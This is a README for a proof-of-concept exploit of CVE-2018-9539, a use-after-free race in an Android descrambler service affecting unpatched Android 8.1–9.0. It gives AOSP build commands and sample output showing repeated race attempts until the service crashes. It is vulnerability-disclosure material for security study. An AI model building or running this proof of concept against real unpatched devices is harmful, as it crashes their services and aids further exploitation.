# CVE-2018-9539

Proof-of-concept code for CVE-2018-9539

If you have any questions, you are welcome to DM me on Twitter ([@tamir_zb](https://twitter.com/tamir_zb)).

## Build

In order to build this:

1. [Download the Android source code](https://source.android.com/setup/build/downloading).
2. Put this repository in `AOSP/external`.
3. Run the following commands:

```
cd AOSP
source build/envsetup.sh
make cas_race_uaf
```

## Result

Running this PoC against an unpatched version of Android (8.1-9.0 before November 2018) should result in a use-after-free. Note that this PoC is not really intended to run on Android 8.1, as it expects the UaF to crash the service, which only happens in Android 9.0, so running this PoC on Android 8.1 will result in an infinite loop.

Here is an example output of running this PoC on Android 9.0:

```
Objects prepared

Attempt #1:
Sessions prepared
Descrambler session set to session1
Threads prepared
Running threads...
Descrambler session set to session2
Thread #0 result: session2
Thread #1 result: session2
Thread #2 result: session2
Thread #3 result: session2
Thread #4 result: session2
Attempt #1 failed, retrying...

Attempt #2:
Sessions prepared
Descrambler session set to session1
Threads prepared
Running threads...
Descrambler session set to session2
Thread #0 result: session2
Thread #1 result: session2
Thread #2 result: session2
Thread #3 result: session2
Thread #4 result: session2
Attempt #2 failed, retrying...

...
...
...

Attempt #204:
Sessions prepared
Descrambler session set to session1
Threads prepared
Running threads...
Descrambler session set to session2
Thread #0 result: session2
Thread #1 result: session2
Thread #2 result: session2
Thread #3 result: session2
Thread #4 result: session2
Attempt #204 failed, retrying...

Attempt #205:
Sessions prepared
Descrambler session set to session1
Threads prepared
Running threads...
Descrambler session set to session2
Thread #0 result: session1
Thread #1 result: session2
Thread #2 result: session2
Thread #3 result: CRASHED :)

Succeeded in 205 attempts
```
